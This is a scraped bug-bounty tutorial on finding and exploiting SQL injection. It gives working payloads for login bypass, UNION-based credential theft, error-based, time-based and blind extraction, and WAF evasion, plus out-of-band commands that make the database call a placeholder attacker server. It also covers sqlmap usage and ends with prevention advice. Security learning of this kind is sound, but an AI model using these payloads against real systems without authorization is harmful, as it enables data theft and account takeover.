---
title: "SQLi: The ultimate Bug Bounty guide to exploiting SQL injection vulnerabilities"
author: Alex Brumen (YesWeHack)
url: https://www.yeswehack.com/learn-bug-bounty/vulnerability-vectors-sql-injection
date_published: 2025-08-12
date_scraped: 2026-11-19
platform: other
disclosed_report: none
bounty: not stated
vuln_class: sqli
---

<!-- Raw scraped text below. Public reference. Bug-bounty-oriented methodology. Images omitted. -->

# SQLi bug bounty guide (YesWeHack)

SQLi occurs when untrusted input is embedded into a SQL query and alters its logic (unauthorized access, modification, deletion). Less prevalent than before (prepared statements, ORMs) but still common, high/critical severity. First hints: an error, strange behaviour, or inconsistent response times after submitting unexpected characters or timing payloads.

Example login-bypass modification: `SELECT * FROM users WHERE username = 'z' OR 1=1 -- -' AND token = 'sometoken';` makes the WHERE always true.

Impact: exfiltrate data, modify/delete records, escalate privileges, achieve RCE by abusing file-write/upload. Persists even with ORMs (e.g. CVE-2022-21661 in WordPress WP_Query).

## Simple detection by response analysis
- `?query=notexist` returns nothing; `?query=notexist' OR true-- -` returns unexpected results.
- A single `'` may trigger a DB error / 500.
- PostgreSQL time test: `?query=noexist' OR sleep(4) -- -` (note: Postgres uses pg_sleep; MySQL uses sleep).

## Injection context cheat sheet (know the clause before automating)
- SELECT: `SELECT author, article FROM posts WHERE postid = <p>;` or `... WHERE item LIKE '%<p>%'`.
- UPDATE: `UPDATE comments SET comment = '<p>' WHERE id = <p> AND owner = '<p>';`
- DELETE: `DELETE FROM files WHERE id = <p> AND owner = '<p>';`
- INSERT: `INSERT INTO users (username,email,password) VALUES ('<p>','<p>','<p>');`
Each clause has its own breakout (quote, parenthesis, UNION).

## Boolean-based (blind)
Login `... WHERE username == '<p1>' AND password == '<p2>'`; send `username=noexist' OR 1=1 -- -` to log in as the first user (usually admin). Compare true vs false app behaviour to infer data.

## UNION
`https://example.com/products?id=5 UNION SELECT username, password FROM users;` needs matching column count + compatible types; displays credentials alongside product data.

## Error-based
`?id=hoodie' AND 1=CAST((SELECT password FROM users) AS int)-- -` leaks the password in the type-conversion error.

## Time-based (blind)
Works well against JSON APIs with uniform responses. MySQL:
```
x'XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR'
'x AND BENCHMARK(40000000,SHA1(1337))-- -
```
MSSQL: `x'; IF (true) WAITFOR DELAY '0:0:05'--`. Combine with boolean via a CASE expression (delay only if the guessed bit is true) to extract data bit by bit. Powerful when an invalid id returns identical responses.

## Out-of-band (OOB) via DNS/HTTP callbacks
Used when in-band/error responses are restricted or the data is stored asynchronously (cookies, Referer logged later). Forces the DB server to make DNS/HTTP requests to your server.
- MySQL: `SELECT 1 INTO OUTFILE '\\\\__ATTACK_SERVER__\\SQLiOOB'` (or LOAD_FILE with a UNC path).
- MSSQL: `exec master..xp_dirtree '//__ATTACK_SERVER__/SQLiOOB'`.
Add a unique subdomain per payload so each callback maps to an endpoint.

## Second-order
Stored input is executed later in a different context without validation (common across microservices: one service sanitizes for its own use, another reuses the stored value unsafely). Inject into a stored field (username, preference), then crawl for the endpoint that reuses it.

## Context-aware payloads (breakout)
A classic `x' OR 1=1 -- -` fails inside an INSERT VALUES tuple (wrong column count). Use `x'||'y` or close the tuple: `x', (SELECT ...), 'y')-- -`. Understand the surrounding syntax ("breakout context") to pick the right terminator.

## WAF bypass / obfuscation
- Comments for spaces: `'/**/OR/**/1=1-- -`.
- Newlines for spaces: `'OR%0A1=1-- -`.
- Parentheses: `'OR(1=1)-- -` (evades a filter blocking `OR 1=1`).
- Mixed case: `'oR 1=1-- -` (defeats case-sensitive regex).

## Tooling
- sqlmap: `sqlmap -u 'http://example.com/search?query=test' -p query --level 2 --dbms=postgresql` (supports tamper scripts for WAF evasion).
- Burp Scanner: detects boolean, time, UNION, OOB, some second-order.

## Prevention
Parameterized queries / prepared statements (gold standard), least-privilege DB access, input sanitization + type validation, monitoring + regression tests, WAF as an extra layer.
